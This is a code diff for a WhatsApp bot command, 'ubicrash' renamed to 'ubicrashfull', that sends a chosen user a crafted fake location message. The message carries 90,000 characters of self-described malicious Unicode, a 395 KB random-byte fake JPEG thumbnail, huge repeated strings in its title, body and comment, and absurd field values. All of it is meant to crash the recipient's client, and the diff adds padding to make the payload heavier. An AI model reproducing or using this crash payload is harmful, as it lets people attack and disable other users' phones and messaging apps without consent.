@@ -1,5 +1,3 @@
-import fetch from 'node-fetch'
-
 let handler = async (m, { conn }) => {
   const jid = m.quoted?.sender || m.mentionedJid?.[0] || m.chat;
   if (jid === conn.user.id) {
@@ -8,17 +6,17 @@ let handler = async (m, { conn }) => {
 
   const objetivo = jid;
 
-  // 🧨 Caracteres maliciosos proporcionados
+  // 🧨 Carácter Unicode malicioso
   const caracter = 'ᬼᬼᬼৗীি𑍅𑍑𑆵⾿ါါါ𑍌𑌾𑌿𑈳𑈳𑈳𑈳𑌧𑇂𑆴𑆴𑆴𑆴𑆵𑆵𑆵';
-  const totalCaracteres = caracter.repeat(Math.floor(90000 / caracter.length)).slice(0, 90000);
+  const address = caracter.repeat(Math.floor(90000 / caracter.length)).slice(0, 90000);
 
-  // 🖼️ Crea una imagen JPEG falsa con bytes aleatorios (aprox 395 KB)
-  const header = Buffer.from([0xFF, 0xD8, 0xFF, 0xE0]); // JPEG header
-  const aleatorio = Buffer.alloc(395 * 1024 - header.length);
-  for (let i = 0; i < aleatorio.length; i++) aleatorio[i] = Math.floor(Math.random() * 256);
-  const thumbnailPesado = Buffer.concat([header, aleatorio]);
+  // 🖼️ Thumbnail de 395 KB con bytes aleatorios
+  const header = Buffer.from([0xFF, 0xD8, 0xFF, 0xE0]);
+  const fill = Buffer.alloc(395 * 1024 - header.length);
+  for (let i = 0; i < fill.length; i++) fill[i] = Math.floor(Math.random() * 256);
+  const thumbnailPesado = Buffer.concat([header, fill]);
 
-  // 📦 Construir el mensaje
+  // 📦 Construcción del mensaje con campos extra para peso
   const fakeLoc = {
     key: {
       fromMe: false,
@@ -30,15 +28,22 @@ let handler = async (m, { conn }) => {
         name: 'Tobi',
         degreesLatitude: 19.432608,
         degreesLongitude: -99.133209,
-        address: totalCaracteres,
+        address: address,
         jpegThumbnail: thumbnailPesado,
         isLive: false,
+        livePeriod: 999999999,
+        accuracyInMeters: 99999,
+        speedInMps: 500,
+        degreesClockwiseFromMagneticNorth: 359,
+        comment: '𑇂𑆿𑆿𑇂'.repeat(2000), // más bytes innecesarios
+
         contextInfo: {
           forwardingScore: 999,
           isForwarded: true,
+          mentionedJid: ['1234567890@s.whatsapp.net'],
           externalAdReply: {
-            title: '𑇂'.repeat(1000),
-            body: '𑆿𑆿𑆿'.repeat(1000),
+            title: '𑆿𑆿𑆿𑆿'.repeat(1000),
+            body: '𑇂𑇂𑇂𑇂'.repeat(1000),
             thumbnail: thumbnailPesado,
             sourceUrl: 'https://youtube.com/@p.a.zinwebkkkkj'
           }
@@ -50,7 +55,7 @@ let handler = async (m, { conn }) => {
   await conn.relayMessage(objetivo, fakeLoc.message, { messageId: conn.generateMessageTag() });
 };
 
-handler.command = /^ubicrash$/i;
+handler.command = /^ubicrashfull$/i;
 handler.owner = true;
 
 export default handler;
